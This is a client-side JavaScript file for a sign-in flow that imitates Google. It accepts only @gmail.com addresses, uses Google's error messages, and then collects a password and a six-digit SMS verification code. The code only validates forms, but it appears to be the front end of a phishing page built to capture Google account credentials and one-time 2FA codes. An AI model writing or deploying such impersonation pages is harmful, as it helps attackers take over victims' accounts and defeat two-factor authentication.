// script.js — Shared client-side interactions

document.addEventListener('DOMContentLoaded', function () {

    /* ══════════════════════════════
       EMAIL FORM VALIDATION
    ══════════════════════════════ */
    const emailForm  = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');
    const emailErr   = document.getElementById('emailErr');

    if (emailForm && emailInput) {
        emailInput.focus();
        emailForm.addEventListener('submit', function (e) {
            const val = emailInput.value.trim();
            if (!val) {
                e.preventDefault();
                showErr(emailErr, emailInput, 'Enter an email or phone number.');
                return;
            }
            if (!/^[^@\s]+@gmail\.com$/i.test(val)) {
                e.preventDefault();
                showErr(emailErr, emailInput, "Couldn't find your Google Account.");
            }
        });
        emailInput.addEventListener('input', () => clearErr(emailErr, emailInput));
    }

    /* ══════════════════════════════
       PASSWORD — SHOW/HIDE (both methods fixed)
    ══════════════════════════════ */
    const pwForm    = document.getElementById('pwForm');
    const pwInput   = document.getElementById('pwInput');
    const pwErr     = document.getElementById('pwErr');
    const eyeBtn    = document.getElementById('eyeBtn');
    const eyeShow   = document.getElementById('eyeShow');
    const eyeHide   = document.getElementById('eyeHide');
    const showPwRow = document.getElementById('showPwRow');
    const showPwBox = document.getElementById('showPwBox');
    const showPwCb  = document.getElementById('showPwCb');

    // Single source of truth
    function setPwVisible(show) {
        if (!pwInput) return;
        pwInput.type = show ? 'text' : 'password';
        if (eyeShow) eyeShow.style.display = show ? 'none'   : 'inline';
        if (eyeHide) eyeHide.style.display = show ? 'inline' : 'none';
        if (showPwBox) showPwBox.classList.toggle('on', show);
        if (showPwCb)  showPwCb.checked = show;
    }

    // Eye icon button
    if (eyeBtn) {
        eyeBtn.addEventListener('click', function (e) {
            e.preventDefault();
            setPwVisible(pwInput.type !== 'text');
            pwInput.focus();
        });
    }

    // "Show password" checkbox row — prevent double-fire from label
    if (showPwRow) {
        showPwRow.addEventListener('click', function (e) {
            e.preventDefault();
            const currentlyOn = showPwBox && showPwBox.classList.contains('on');
            setPwVisible(!currentlyOn);
            pwInput.focus();
        });
    }

    if (pwForm && pwInput) {
        pwInput.focus();
        pwForm.addEventListener('submit', function (e) {
            if (!pwInput.value) {
                e.preventDefault();
                if (pwErr) showErr(pwErr, pwInput, 'Enter a password.');
            }
        });
        if (pwErr) pwInput.addEventListener('input', () => clearErr(pwErr, pwInput));
    }

    /* ══════════════════════════════
       SMS FORM
    ══════════════════════════════ */
    const smsForm   = document.getElementById('smsForm');
    const codeInput = document.getElementById('codeInput');
    const codeErr   = document.getElementById('codeErr');

    if (codeInput) {
        codeInput.focus();
        codeInput.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            if (codeErr) clearErr(codeErr, codeInput);
        });
        if (smsForm) {
            smsForm.addEventListener('submit', function (e) {
                const v = codeInput.value.trim();
                if (!v) {
                    e.preventDefault();
                    showErr(codeErr, codeInput, 'Enter the verification code.');
                } else if (!/^\d{6}$/.test(v)) {
                    e.preventDefault();
                    showErr(codeErr, codeInput, 'Enter a valid 6-digit code.');
                }
            });
        }
    }

    /* ══════════════════════════════
       "DON'T ASK AGAIN" CHECKBOX
    ══════════════════════════════ */
    const dontAskLabel = document.getElementById('dontAskLabel');
    const dontAskBox   = document.getElementById('dontAskBox');
    if (dontAskLabel && dontAskBox) {
        dontAskLabel.addEventListener('click', function (e) {
            e.preventDefault();
            dontAskBox.classList.toggle('on');
        });
    }

    /* ══════════════════════════════
       RESEND COUNTDOWN TIMER
    ══════════════════════════════ */
    const resendLink = document.getElementById('resendLink');
    if (resendLink) {
        let secs = 30;
        resendLink.textContent = 'Resend it (' + secs + 's)';
        const t = setInterval(() => {
            secs--;
            if (secs <= 0) {
                clearInterval(t);
                resendLink.classList.remove('off');
                resendLink.textContent = 'Resend it';
            } else {
                resendLink.textContent = 'Resend it (' + secs + 's)';
            }
        }, 1000);
    }

    /* ══════════════════════════════
       HELPERS
    ══════════════════════════════ */
    function showErr(el, input, msg) {
        if (!el) return;
        el.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="#f28b82" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="11"/><path d="M12 7v6" stroke="#2d2e30" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17.5" r="1.2" fill="#2d2e30"/></svg> ' + msg;
        if (input) input.classList.add('err');
        if (input) input.focus();
    }
    function clearErr(el, input) {
        if (el) el.innerHTML = '';
        if (input) input.classList.remove('err');
    }
});
